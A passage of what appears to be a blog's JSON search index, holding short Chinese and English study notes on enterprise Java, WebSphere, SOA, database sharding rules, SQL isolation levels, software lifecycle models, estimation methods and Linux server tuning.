      "content": "Non functional Requirement(NFR): sizing estimatation of app: register user -&gt; concurrent user -&gt; active concurrent user active concurrent user: one connection to http server and on thread of execution running in app server(1:10 of concurrent user, for OLTP On-Line Transation Processing,it is about 1:5) inactive concurrent user 需要考量的有： Number of concurrent users(session timeout setting) Requests per second(CPU load) Logons per second(CPU sizing of LDAP and DB) Availability = MTBF/(MTBF+MTTR) MTBF: Mean Time Between Failure MTTR: Mean Time To Repaire ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-37/"
    } ,
  
    {
      "title"    : "SOA notes",
      "category" : "iteye",
      "content": " two feature for SOA   1.1 reuse existing IT asset(EIS)   1.2 loosely coupling, integration 2. product  HP BTO(Business Tech. Optimizer) HP SOA governance Systinet is responsible for:     repository,registry     SLA, Service Level Agreement     policy management, security/transation     Service Life Cycle management,     QoS, Reliable Message 3. difference between JAX-WS2.0 and JAX-RPC   new API   Annotations programming model   Asynchronous programming model   provider/dispatch动态编程模型 4. SOAP message structure    Envelope     Header     Body     Fault     simple/complex Type 5. WSDL structure    Types    Message    PortType: that is interface, include multi operations    Binding: communication protocol binding      Service: include multi portType    ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-38/"
    } ,
  
    {
      "title"    : "数据库分库分表规则",
      "category" : "iteye",
      "content": "分库分表 摘自: http://rdc.taobao.com/team/jm/archives/590 一般有几个目标： 数据离散性，数据分布到多个库，多个表中 mod, round robin, dayofweek,dayofMonth   避免热点数据在一个数据库库表上   扩容时有大的数据迁移   以下的解决方案基于 整表搬迁但不会有表中行级数据迁移   【水平扩展scale-out方案模式一】 阶段一：一个库DB0之内分4个表，id%4 dbRule: “DB0&quot; tbRule: “t”  + (id % 4) 阶段二：增加db1库，t2和t3整表搬迁到db1 dbRule: “DB&quot; + ((id%4)/2) tbRule: “t”  + (id % 4) 阶段三：增加DB2和DB3库，t1整表搬迁到DB2，t3整表搬迁的DB3： 为了规则表达，通过内部名称映射或其他方式，我们将DB1和DB2的名称和位置互换得到下图 dbRule: “DB&quot; + (id%4) tbRule: “t”  + (id % 4)     如果更进一步数据库的设计和部署上能做到每个表一个硬盘，那么扩容的过程只要把原有机器的某一块硬盘拔下来， 插入到新的机器上，就完成整表搬迁了！可以大大缩短停机时间。 具体在mysql上可以以库为表。开始一个物理机上启动4个数据库实例，每次倍增机器，直接将库搬迁到新的机器上。 这样从始至终规则都不需要变化，一直都是： dbRule: “DB” + (id % 4) tbRule: “t”  + (id % 4)   不足是： 即逻辑上始终保持4库4表，每个表一个库。 从一个库到4个库的过程中，单表的数据量一直在增长。当单表的数据量超过一定范围时，可能会带来性能问题。比如索引的问题，历史数据清理的问题。 另外当开始预留的表个数用尽，到了4物理库每库1个表的阶段，再进行扩容的话，不可避免的要从表上下手。     【水平扩展scale-out方案模式二】 阶段一：一个数据库，两个表 分库规则dbRule: “DB0″ 分表规则tbRule: “t” + (id % 2) 阶段二：当单库的数据量接近1千万，单表的数据量接近500万时，进行扩容（数据量只是举例，具体扩容量要根据数据库和实际压力状况决定）： 增加一个数据库DB1，将DB0.t1整表迁移到新库DB1。 每个库各增加1个表，未来10M-20M的数据mod2分别写入这2个表：t0_1，t1_1： 分库规则dbRule: “DB” + (id % 2) 分表规则tbRule: if(id &lt; 1千万){  return &quot;t&quot;+ (id % 2); //1千万之前的数据，仍然放在t0和t1表。t1表从DB0搬迁到DB1库  }else if(id &lt; 2千万){  return &quot;t&quot;+ (id % 2) +&quot;_1&quot;; //1千万之后的数据，各放到两个库的两个表中: t0_1,t1_1  }else{  throw new IllegalArgumentException(&quot;id outof range[20000000]:&quot; + id);  } 这样10M以后的新生数据会均匀分布在DB0和DB1; 插入更新和查询热点仍然能够在每个库中均匀分布。 每个库中同时有老数据和不断增长的新数据。每表的数据仍然控制在500万以下。   阶段三：当两个库的容量接近上限继续水平扩展时，进行如下操作： 新增加两个库：DB2和DB3. 以id % 4分库。余数0、1、2、3分别对应DB的下标. t0和t1不变， 将DB0.t0_1整表迁移到DB2; 将DB1.t1_1整表迁移到DB3 20M-40M的数据mod4分为4个表：t0_2，t1_2，t2_2，t3_2，分别放到4个库中：   分库规则dbRule: if(id &lt; 2千万){  //2千万之前的数据，4个表分别放到4个库  if(id &lt; 1千万){   return &quot;db&quot;+ (id % 2);  //原t0表仍在db0, t1表仍在db1  }else{   return &quot;db&quot;+ ((id % 2) +2); //原t0_1表从db0搬迁到db2; t1_1表从db1搬迁到db3  } }else if(id &lt; 4千万){  return &quot;db&quot;+ (id % 4);  //超过2千万的数据，平均分到4个库 }else{  throw new IllegalArgumentException(&quot;id out of range. id:&quot;+id); } 分表规则tbRule:   if(id &lt; 2千万){  //2千万之前的数据，表规则和原先完全一样，参见阶段二  if(id &lt; 1千万){   return &quot;t&quot;+ (id % 2);  //1千万之前的数据，仍然放在t0和t1表  }else{   return &quot;t&quot;+ (id % 2) +&quot;_1&quot;; //1千万之后的数据，仍然放在t0_1和t1_1表  } }else if(id &lt; 4千万){  return &quot;t&quot;+ (id % 4)+&quot;_2&quot;; //超过2千万的数据分为4个表t0_2，t1_2，t2_2，t3_2 }else{  throw new IllegalArgumentException(&quot;id out of range. id:&quot;+id); }     dbRule: “DB” + (id % 4) tbRule: “t”  + (id % 4) ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-4/"
    } ,
  
    {
      "title"    : "需求管理是要分层次的",
      "category" : "iteye",
      "content": "客户中不同角色对需求有不同层次的理解： 1. 管理层可能不了解具体的业务，但会提出一些大的方向。 2. 中层负责具体的业务逻辑，这是比较容易出错的 3. 操作人员理解的主要是界面，从这里得到的需求可能比较片面 理清需求的层次后，我们需要把握哪些需求是最重要的。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-41/"
    } ,
  
    {
      "title"    : "需求管理",
      "category" : "iteye",
      "content": "Manage Requirement Identify inconsitency Output: BRS: Business Requirements Spec SRS: System Requirements Spec RTM: Requirements Traceability Matrix 需求跟踪矩阵      Business ReqId,UserCaseId,SystemRequirementId,HighLevelDesign Id(SA),LowLevelDesineId,BuildNo,ReleaseId      开发需求时需要为每个需求编号，这样需求跟踪矩阵中对ReqId, UsercaseId,buildno可以更好的跟踪。因为后面buildno（No格式）中可能包括reqId. CR: Change Request PR: Problem Request CCB: Change Control Board ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-42/"
    } ,
  
    {
      "title"    : "persistence solution",
      "category" : "iteye",
      "content": " straight Jdbc trivial app, report app 2. Hibernate session -------- Persistent Manager hibernate.cfg.xml 3. iBatis: SqlMap ------- Persistent Manager SqlMapConfig.xml 4. EJB 3 entity bean 5. Spring jdbc template ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-43/"
    } ,
  
    {
      "title"    : "JSF Component &amp; Render",
      "category" : "iteye",
      "content": "when using JSF, some scenarios are difficult to deal with. e.g. 1. multi rows raido buttons in dataTable      2. multi columns radio buttons in dataTable      The radio buttons don't fall in the one radio group, so they don't behave as one radio group Solution: create customize component      step1, inherit and implement component class            add one overrideName field, so we can override the radio names generated by radio button. In this way, multi-row or column radios are considered in one radio group      step2, inherit and implement render class          override Decode(apply request phase, retrive the value from request obj and apply to component)          override Encode(render response phase)      step3, customize tag lib http://www.javaworld.com/javaworld/jw-02-2007/jw-02-jsf.html?page=2 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-44/"
    } ,
  
    {
      "title"    : "Wav 文件格式",
      "category" : "iteye",
      "content": "http://ccrma.stanford.edu/courses/422/projects/WaveFormat/ ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-45/"
    } ,
  
    {
      "title"    : "Quality Basic Training",
      "category" : "iteye",
      "content": "CMMI ITIL/ITSM ISO20K ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-46/"
    } ,
  
    {
      "title"    : "IBM ESB product",
      "category" : "iteye",
      "content": "Service Integration Bus在WebSphere Application Server中，是早期IBM实现ESB产品，现在虽然可以作为一种开发策略，但已不推荐使用，推荐使用WESB(WebSphere Enterprise Service Bus)提供的ESB服务. WESB为构建在开放标准和SOA的IT环境提供了一个ESB，相对Sibus来说它使构建中间层更简单，更容易管理，可以在前期开发中介功能，提供更广泛的连接。WID为WESB提供了一个很好的开发工具，通过构建Mediation module来提供ESB服务，如下面WESB的中介模型图。 IBM现在的ESB产品有： Websphere ESB Websphere Message Broker Websphere DataPower Mediation module是一个特殊的SCA module，该模块在SCA的模块之间，以及SCA和非SCA之间建立了交流的桥梁。通过Mediation module可以截取、修改服务请求者（SCA Export）和服务提供者（SCA Import）之间传递的消息，从而减少依赖、降低耦合度。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-47/"
    } ,
  
    {
      "title"    : "Java EE 5编程模型",
      "category" : "iteye",
      "content": "From http://www.ibm.com/developerworks/cn/websphere/library/techarticles/0809_alcott/0809_alcott.html     引入IOC 和 Annotation 编程模型注入指定的对象和资源 @EJB   @WebService, JAX-WS     EJB -&gt; POJO, JPA, EJB3.0 Entity Bean   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-48/"
    } ,
  
    {
      "title"    : "Negotiation Skill",
      "category" : "iteye",
      "content": " Prepare before  beginning to negotiate 1.1 Define the negotiation objectives, Bottom line, Alternatives if failed 1.2 Know of the other party in advance, what they want 1.3 Determine who is the decision maker, negotiate with the decision makers directly   2. Conduct the negotiation 2.1 set time limits 2.2 consider small concessions that are highly valued by the other party, also seek a return concession accordingly. 2.3 if discussion start to heat up, break off discussions for a short time or postpone to future date   3. Close the negotiation and document the agreement   4. Implement the negotiated agreement 4.1 measure and evaluate performance 4.2 retrospective analysis, learn to improve your negotiation skills ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-49/"
    } ,
  
    {
      "title"    : "有趣的java类",
      "category" : "iteye",
      "content": " WeakHashMap 作用：访问这个map时会检查所有entry，如果有key是not reachable,(GC中的概念), 就会purge该entry   场景：比如我们有这个一个接口，接口中有add/remove方法。主要是维护子类中HashMap中的对象。要求是调用者自己负责add/remove对象。忘掉remove对象的话可能会OOM。这时候可以采用WeakHashMap ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-5/"
    } ,
  
    {
      "title"    : "DataPower and Hessian in SOA",
      "category" : "iteye",
      "content": " SOAP and Hessian 简单对象访问协议 (SOAP) 是基于 XML 的简易协议，提供了标准的 RPC 方法来调用 Web service，可使应用程序在 HTTP 之上进行信息交换。   Hessian 协议则是轻量级的远程过程调用（RPC）协议的典范，它基于 HTTP 协议传输编码后的二进制消息，Hessian 协议也被称为 HBWSP（Hessian Binary Web Service Protocol）。Hessian 是一个轻量级的、自定义描述的二进制 RPC 协议，它把文本格式的数据编码为二进制数据，仅用一个字符作为结构化标记，具有高效和简单的优势。   2. DataPower   DataPower 是 IBM 针对面向服务架构（SOA）所推出的又一重要产品。DataPower 产品家族主要包括三款产品：WebSphere DataPower XA35，WebSphere DataPower XS40 和 WebSphere DataPower XI50。其中 XI50 侧重于企业消息总线及应用程序集成，能够以经济有效的方式支持大型机、线速企业消息总线和企业应用程序集成。DataPower 能够在不同消息格式（包括二进制格式、遗留格式和 XML 格式）之间进行转换，并提供消息路由和安全性。   2.1 用DP的理由 实现 Web 服务网关有多种方案，例如可以 WebSphere Message Broker 实现网关将协议进行转化，但在本应用场景中，电信企业对服务应用的效率要求很高，而且对数据格式的转换要求比较灵活并且高效。在这些方面，WebSphere Data Power 具有天然的优势，实现硬件级别的加速。   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-50/"
    } ,
  
    {
      "title"    : "JAX-RPC",
      "category" : "iteye",
      "content": "与 Java Architecture for XML Binding（JAXB）或 Java API for XML Processing（JAXP），甚至 JDBC 等标准 API 一样，JAX-RPC 其实是一个 API 规范。换句话说，它仅仅是一个文档，其中规定了一组 Java 类和接口。 这个文档描述 JAX-RPC 类和接口的行为；它并没有描述如何构建 JAX-RPC 应用程序，但是详细规定了涉及的组件以及如何用 Java 构造表示它们。   JAX-RPC 包含的类和接口都放在 javax.xml.rpc 包和几个子包中： javax.xml.rpc.encoding javax.xml.rpc.handler javax.xml.rpc.handler.soap javax.xml.rpc.holders javax.xml.rpc.server javax.xml.rpc.soap javax.xml.rpc 包中的三个接口是核心组件： javax.xml.rpc.Call javax.xml.rpc.Service javax.xml.rpc.Stub JAX-RPC 的设计者定义了一个规范，然后编写了许多接口。这些接口定义类名和行为，但是它们没有实现 这些行为。生产商可以编写自己的 API 来实现 JAX-RPC 的标准接口。 安装 JAX-RPC 实际上是指安装 JAX-RPC 的一种实现。 为了方便，所有 JAX-RPC 接口都附带有可用的实现，而且经过适当的打包。所以尽管可以下载 JAX-RPC 规范文档，但是不需要安装 JAX-RPC，只需安装这个 API 的某种实现。   JAX-RPC 其中一个实现是 Apache Axis 1.4 。Axis 是免费的、开放源码且得到良好的支持。   note：JAX-WS 将要替代 JAX-RPC。 Axis 2.x 支持 JAX-WS ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-51/"
    } ,
  
    {
      "title"    : "SCA",
      "category" : "iteye",
      "content": "SCA (Service Component Architecture) 是一个开发SOA(Service-Oriented Architecture)面向服务应用的简单模型规范，它描述用于使用SOA构建应用程序和系统的模型。它可简化使用SOA进行的应用程序开发和实现工作。   组件 是指一个基本的 SCA 工件，是业务应用程序的构建块。它提供基本的业务功能，比如股票报价服务或计算器服务。组件可以具有一些属性来控制业务服务的行为，并且提供组件的配置。一个 SCA 组件可以通过多种技术实现。SCA 规范定义了一组基本的实现类型（JAVA，C++，BPEL，PHP， Spring），并且允许其他 SCA 组件进行递归组合。   SCA 组件的功能被作为服务提供给其他组件；一个 SCA 组件可以通过一个引用（reference）来利用服务。服务和引用被关联在一起并显示出来，并通过推广发布到外部世界中。每个服务或引用都有一个接口，将业务接口描述为一组方法。每个方法有一个名字、若干参数和一个返回值。SCA 使用一个 Java 语言接口或通过一个 Web Services Description Language (WSDL) 文件定义这些接口。每个服务和引用通过一个访问绑定 来访问。绑定定义了用来访问服务或引用的协议。目前，SCA 规范包含了一组基础的流行绑定技术，比如 Web Service，JMS， EJB，JSON RPC。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-52/"
    } ,
  
    {
      "title"    : "IBM Portal",
      "category" : "iteye",
      "content": " IBM portal server 基于App Server app server: 管理：Http://hostname:9060/ibm/console 应用：Http://hostname:9080   2. portal server  应用：http://hostname:10038/wps/portal  管理：https://hostname:10039/ibm/console    PortalServer的端口可以通过文件 /PortalServer/config/wpconfig.properties来修改 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-53/"
    } ,
  
    {
      "title"    : "WAS classloader",
      "category" : "iteye",
      "content": "      How about the JVM classpath defined in WAS admin console? Anybody can deeper clarify? ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-54/"
    } ,
  
    {
      "title"    : "WAS Cell, Node, Profile, Server",
      "category" : "iteye",
      "content": " Cell 单元是整个分布式网络中一个或多个节点的逻辑分组。单元是一个配置概念，是管理员将节点间逻辑关联起来的实现方法。管理员根据具体的业务环境，制定对其整体系统集成环境有意义的条件来定义和组织构成单元的节点。就一般情况来说，可以将单元看作是最大的作用域。 　　在 IBM WAS ND 产品中，管理配置数据都存储在 XML 文件中。单元保留了它每个节点中每台服务器的主配置文件。同时每个节点和服务器也有其自己的本地配置文件。如果服务器已经属于单元，则对于本地节点或服务器配置文件的更改都是临时的，通过在本地提交更改生效时，本地更改覆盖单元配置，但是当执行单元配置文档同步到节点的操作时，在单元级别上对主控服务器和主节点配置文件所作的更改将会替换对该节点所作的任何临时更改。     2. Node 节点是受管服务器（Server）的逻辑分组。节点通常与具有唯一 IP 主机地址的逻辑或物理计算机系统对应，节点不能跨多台计算机。节点分为受管节点与非受管节点       3. Node=Profile。 WebSphere Application Server V6 引进了概要文件（profile）概念，目的是将产品的二进制文件（binaries）与用户数据物理分离，并使用户能定义多组用户数据。通常情况下，用户数据包括配置文件、部署的应用程序、日志文件和临时工作区等   WebSphere Application Server V6 产品安装程序将创建的文件分别放在两个隔离的环境中：一个用于安装产品二进制文件(Websphere 安装程序)，另一个用于创建初始概要文件。   Node 是管理上使用的概念，Profile 是实际的概要文件，它们代表同一事物。Server 就是所谓的 Application Server Instance , 这是我们实际要布署 Application 的地方。在IBM WAS ND 产品中受管节点的 Node Agent 目的就是让 Deployment Manager Server 可以透过 Node Agent 来管 Node (Profile) 中的 Application Server Instance，一个 Node (Profile) 中可以有多个 Application Server Instance。 　　如果是非 ND 版本 , 则属于 Single Server 版本，那么一个 Node (Profile) 中只能有一个 Application Server Instance，如果你希望在一台机器上有多个 Application Server Instance，那就只能透过创建多个 Profile (Node) 来达成，但这些 Node (Porfile) 彼此独立没有管理上的关系 (RelationShip)，只要使用的 TCP/IP Port 不要冲突即可。         From: http://www.webspherechina.net/?viewnews-5560.html ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-55/"
    } ,
  
    {
      "title"    : "Websphere性能调优",
      "category" : "iteye",
      "content": " JVM Heapsize     -Xms     -Xmx   2. GC     什么时候收集     Heap Fragmentation   3. Web Container     ThreadPool      Buffer      Timeout      Keep-alive   4. EJB Container   5. Data Source      最大/小连接数      JDBC Driver类型的选择 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-56/"
    } ,
  
    {
      "title"    : "JDBC Driver Type",
      "category" : "iteye",
      "content": "Type 1: JDBC-ODBC Drawback: client code must be loaded and configured on each client machine.   Type 2: A Native-API partly-Java driver JDBC call -&gt; client API drawback: require native code on the client sample: Oracle OCI through SQL*net Type 3: A Net-Protocol All-Java driver JDBC call -&gt; DBMS-independent net protocol -&gt; DBMS protocol(by middleware server)   Type 4: A Native-Protoco All-Java driver JDBC call -&gt; DBMS server Sample: Oracle JDBC THIN driver ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-57/"
    } ,
  
    {
      "title"    : "websphere 小知识",
      "category" : "iteye",
      "content": " Websphere 产品安装信息命令 versionInfo     产品属性文件查找 查看&lt;was_home&gt;/properties/version/WAS.product       查看任意概要文件(profile)下的SystemOut.log文件，此文件包含WebSphere Application Server产品相关信息. &lt;profile_home&gt;/logs/server1/SystemOut.log     2. 故障诊断工具 FFDC(First Failure Data Capture) &lt;profile_home&gt;/logs/ffdc   3.  通过从命令行运行 java -fullversion 看JDK信息    &lt;was_home&gt;/java/bin/java -fullversion   4. 检查Windows平台上的IBM HTTP Server的版本信息，运行apache.exe -v   5. 日志文件 5.1 JVM日志 installation_root/profiles/profile_name/logs/server_name 5.2 进程日志 installation_root/logs/applicationServerName/native_stderr.log 和 native_stdout.log 5.3 服务日志(二进制文件)  install_root/logs/activity.log installation_root/bin/showlog   6. 日志分析器 &lt;was_home&gt;/bin/waslogbr.bat install_root/logs/activity.log   7. port config WAS_INSTALL_ROOT  profiles&lt;profileName&gt;  config  cells&lt;cellName&gt;  odes&lt;nodeName&gt;         ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-58/"
    } ,
  
    {
      "title"    : "隔离级别与脏读幻读",
      "category" : "iteye",
      "content": " 数据库操作 issue 更新丢失（lost update）：当系统允许两个事务同时更新同一数据时，发生更新丢失 脏读（dirty read）：当一个事务读取另一个事务尚未提交的修改时，产生脏读。 非重复读（nonrepeatable read）：同一查询在同一事务中多次进行，由于其他提交事务所做的修改或删除，每次返回不同的结果集，此时发生非重复读。(A transaction rereads data it has previously read and finds that another committed transaction has modified or deleted the data. ) 幻像（phantom read）：同一查询在同一事务中多次进行，由于其他提交事务所做的插入操作，每次返回不同的结果集，此时发生幻像读。(A transaction reexecutes a query returning a set of rows that satisfies a search condition and finds that another committed transaction has inserted additional rows that satisfy the condition. )   ANSI/ISO SQL92标准定义的隔离级别： 未提交读（read uncommitted） 提交读（read committed)这是大多是数据库的默认隔离级别并被大多vendors支持 重复读（repeatable read） --行级锁定，不能写该行 序列化（serializable）   --表锁定，不能插入新的数据            参考: http://kakaluyi.iteye.com/blog/185473         ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-59/"
    } ,
  
    {
      "title"    : "WID &amp; Process Server",
      "category" : "iteye",
      "content": " How to deploy CommonLibrary project?  We know module is deployed in the form of  ear.   2. 业务流程执行语言 (BPEL)     BPEL 流程和其他的组件都是使用 WSDL 接口进行描述的。   3. 业务规则有两种类型：规则集 和决策表   4. IBM 定义的SOA的生命周期: Model, Assemble, Deploy, Manage     WID 支持 Assemble阶段     WAS 支持 Deploy 阶段 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-60/"
    } ,
  
    {
      "title"    : "SQL",
      "category" : "iteye",
      "content": "Oracle SQL 摘自:http://www.itpub.net/608483.html DECODE的语法DECODE(value,if1,then1,if2,then2,if3,then3,...,else) to_date('2008-04-23 00:00:00' ,'yyyy-mm-dd hh24:mi:ss') SELECT TO_CHAR(CURRENT_DATE, 'YYYY-MM-DD') FROM dual; SUBSTR 从1开始而不是0    SUBSTR ('shidong', 2) return idong Oracle PIPELINED   Pipelined functions are useful if there is a need for a data source other than a table in a select statement. Typical Pipelined Example: The producer function must use the PIPELINED keyword in its declaration. The producer function must use an OUT parameter that is a record, corresponding to a row in the result set. Once each output record is completed, it is sent to the consumer function through the use of the PIPE ROW keyword The producer function must end with a RETURN statement that does not specify any return value. The consumer function or SQL statement then must use the TABLE keyword to treat the resulting rows from the PIPELINE function like a regular table. 定义返回类型: CREATE OR REPLACE TYPE myObjectFormat AS OBJECT ( A INT, B DATE, C VARCHAR2(25) ) /   CREATE OR REPLACE TYPE myTableType AS TABLE OF myObjectFormat /   定义包/包体: CREATE OR REPLACE PACKAGE myDemoPack AS FUNCTION prodFunc RETURN myTableType PIPELINED; END; /   CREATE OR REPLACE PACKAGE BODY myDemoPack AS FUNCTION prodFunc RETURN myTableType PIPELINED IS BEGIN FOR i in 1 .. 5 LOOP PIPE ROW (myObjectFormat(i,SYSDATE+i,'Row '||i)); END LOOP; RETURN; END; END; / 客户端调用: SELECT * FROM TABLE(myDemoPack.prodFunc()); ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-61/"
    } ,
  
    {
      "title"    : "签名证书",
      "category" : "iteye",
      "content": "Java   一. 签名        消息明文+ 发送者私钥(hash(消息明文))  ----------------&gt;  接收者比较hash(消息明文）和发送者公钥（签名），相同则可以确认发送者身份。          上面的 发送者私钥(hash(消息明文)) 即签名 因为消息是明文发送的，可以在发送方先用 接收者公钥（消息明文+ 发送者私钥(hash(消息明文))）加密发送，接收者用接收者私钥先解密接收到的密文。           不知可不可以这么说，私钥加密（发送者密钥）是为了证明发送者身份。公钥加密（接收者公钥）是为了加密消息？ 二. 证书         证书中保存了公钥，用户信息，期限等 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-62/"
    } ,
  
    {
      "title"    : "软件过程",
      "category" : "iteye",
      "content": " Engineering 1.1 Requirments Enginerring 1.2 Design 1.3 Technical Review 1.4 Construct(Code &amp; Unit Testing ) 1.5 System &amp; Software Integration 1.6 Integration &amp; System &amp; User Acceptance Testing 1.7 Release Management 1.8 User Documentation 1.9 Maintenance &amp; Migration/Porting Process   2. Project Managment 2.1 Project Initiation 2.2 Project Planning &amp; Estimation 2.3 Risk Management 2.4 Project Quality Management 2.5 Project Monitoring &amp; Control 2.6 Project Closure 2.7 Supplier Agreement Management   3. Process Management 3.1 Process Definition &amp; Improvement &amp; Deployment 3.2 Organization Innovation 3.3 Quantitative Process Management     4. Support 4.1 Change Management 4.2 Configuration Management 4.3 Quality Assurance 4.4 Causal Analysis &amp; Resolution 4.4.1 Defect Classification 4.4.2 Fishbone Diagram 4.4.3 Pareto Analysis 4.4.4 5Whys   4.5 Decision Analysis &amp; Resolution 4.5.1 PUGH Matrix   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-63/"
    } ,
  
    {
      "title"    : "Application Development and Integration life cycle",
      "category" : "iteye",
      "content": " Waterfall Lifecycle          This model supports large and complex projects in which the requirements are well defined.   It adopts sequential approach from requirements analysis through design, construction, testing and application deployment.   2. V Lifecycle       适合对系统可靠性要求比较高的项目。强调测试。     This model supports new product development or large enhancement projects when the size and complexity of the system is large enough to have a multilayered design.  Adopt this model when the requirements are well understood, complete, and stable and the technology &amp; architecture of the solution is clear and visible.        SOW(UAT plan)---Requirement(System Test plan)---Architecture Design(Integration Test plan)---Low Level Design(Unit Test Plan)----Construct(V model bottom) ---Unit Test ---Integration Test ---System Test ---UAT   2.1 Feature  Concurrent Phases or Activities  Mandatory unit testing  Easy to plan   Emphasizes and encourages Verification and Validation at all phases       2.2 Disadvantage  Does not handle iterations  Changes are expansive  More documentation and mandatory sign-off to move out  of the phase  Like waterfall model, Product is not visible until the end   3. Staged Lifecycle     架构已经定义好，允许分阶段的Low Level Design 和实现。   In this model, certain intermediate work products (incremental deliveries) will be delivered to the client before final delivery of the entire application.   It supports product development or large enhancement projects when the requirements are not well understood and skeptic on stability of requirements.   The Staged Lifecycle is best suitable for the development of new products or for executing large enhancements.    Cycle: Low level Design --- Build --- IT,ST,REL,AT 3.1 Feature when the requirements not well understood, not complete or not stable. when there is a need for continuous deliveries from customer side. when allow incremental design and implementation in a number of stages. allow for specification changes in the subsequent release   3.2 Disadvantage need careful planning extra overhead on multiple release determining stage dependencies is difficult     4. Iterative Lifecycle  This model supports large and complex projects with the following characteristics:  Where continuous quality check &amp; high degree of requirements management is needed through out the project.    Where the requirements will change considerably and the environment is not stable. Where it is not possible to specify the requirements in enough details upfront. Where delivering on time is essential, irrespective of the functionality.   cycle: Envisioning（构思） --- Design ---Build --- Test --- Release &amp; Deployment           上面cycle中每个阶段中分多次迭代。     5. Rapid Applicaton Development Lifecycle     ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-65/"
    } ,
  
    {
      "title"    : "ESB 网关",
      "category" : "iteye",
      "content": "ＩＢＭ　ＥＳＢ（Ｅｎｔｅｒｐｒｉｓｅ　Ｓｅｒｖｉｃｅ　Ｂｕｓ）为ＳＯＡ的服务提供者和消费者的交互提供中转， 连接，和分离。支持协议和消息格式的转换。   ESB一般位于隔离区(Demilitarized Zone), 进一步抵御来自企业区之外的恶意或未授权的访问。 “ESB 网关至少提供 ESB 与外部使用者/提供者之间的服务地址转换。在实践中，ESB 网关通常提供附加服务，例如安全性、消息转换和合作伙伴数据管理。” WebSphere DataPower 设备（例如 XI50 型）是作为主入口来公开的理想候选网关，用于所有的传入服务请求以及各自的响应。  主要是协议的转换。 同时与TAM(Tivoli Access Manager)协作提供安全性。这时候DataPower充当策略强制点。TAM充当策略决策点和标识提供者，并进行身份验证和授权决策。 与WSRR(WebSphere Services Registry and Repository)结合提供服务虚拟化。WSRR存储WSDL（端口地址，消息格式）  ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-66/"
    } ,
  
    {
      "title"    : "XP Feature",
      "category" : "iteye",
      "content": "敏捷最佳实践 迭代开发 TDD 测试驱动开发 CI 持续集成     CI的频率为一天时,就称为Daily Build,每日构建?CI鼓励尽早check in代码, 尽快发现问题并反馈. 而不是把时间花在Bug会议上 Refactor 重构 PP 结对编程 On-site Customer ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-67/"
    } ,
  
    {
      "title"    : "work estimation",
      "category" : "iteye",
      "content": " Work Breakdown Structure        Three Point Estimate       effort of Activity = ((Most probable Value * 4) + Pessimistic Value + Optimistic Value)/6   2. Lines of Code     Measure after the coding phase     Measure at the beginning of maintenance or conversion project     3. Delphi     several engineers individually produce estimates and converge on a consensus estimate at last. 3.1 A group of experts is each given the program's SPECs and estimation form 3.2 the experts discuss 3.3 anonymously list project tasks and  a size estimate 3.4 moderator collects the estimates and tabulates the results and return them to the experts 3.5 only each expert's personal estimate is identified; all others are anonymous. 3.6 experts discuss and review the tasks 3.7 continues from step 3.3 again utill converge to within an acceptable range     4. Function Point         Five aspects considered:        * External Inputs(EIs), Add&amp;Update&amp;Delete Records        * External External Outputs(EOs), Records Summary&amp;Details        * External Inquiries(EQ),an input/output flow where input immediately generates the output, no logical data files modified        * Internal logical files(ILFs),maintained data model entity        * External Interface files(EIFs), maintained outside of the application       step1: determine the type of project: development project, enhancement project,installed application       step2: identify the Counting Boundary       step3: determine an unadjusted function point count       step4: Determine a value adjustment factor       step5: Calculate the adjusted function point count            ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-69/"
    } ,
  
    {
      "title"    : "linux服务器调优",
      "category" : "iteye",
      "content": "学习笔记，摘自kuqin  http://www.kuqin.com/linux/20110910/264584.html     一 可以从如下四个方面观察你的服务器机器目前的性能情况： CPU  内存  磁盘I/O带宽  网络I/O带宽  二 对如何评估系统性能有个基本的标准，经过一段时间的观察，归纳如下：  对于CPU，正常情况（非高峰期）下， user% + sys% &lt; 60% 是很好的情况  也许你会问，为什么要小于60%，剩余的40%做什么？这个是业务性质决定的，tx的业务都是有时间段高峰期的，比如早九点-十点，晚八点-十点，是用户访问高峰期，我们要保证服务器能够处理尖峰并发，所以大多时候有30%~40%的空闲是可以接受而且是必须的。当你的服务器在平时cpu使用率一直&gt;80%，那就要不得不考虑扩容或者程序本身性能优化了调皮。  对于内存，同样正常情况下，Swap In（si）＝0，Swap Out（so）＝0是很好的情况，当然允许偶尔的尖峰，但是曲线要相对平滑，消峰是很有必要的。如果出现 Per CPU with 10 page/s，那么就要重点观察了。  对于磁盘，正常情况下，iowait % &lt; 25%是很好的情况，如果长期&gt;40%,那么就会影响反映能力了  其中：  %user：表示CPU处在用户模式下的时间百分比。  %sys：表示CPU处在系统模式下的时间百分比。  %iowait：表示CPU等待输入输出完成时间的百分比。  swap in：即si，表示虚拟内存的页导入，即从SWAP DISK交换到RAM  swap out：即so，表示虚拟内存的页导出，即从RAM交换到SWAP DISK。  三 接下来介绍，在工作中常用到的性能分析工具， 有些常用的系统命令：  vmstat、sar、iostat、netstat、free、ps、top等  工作中，我比较常用的组合方式为: 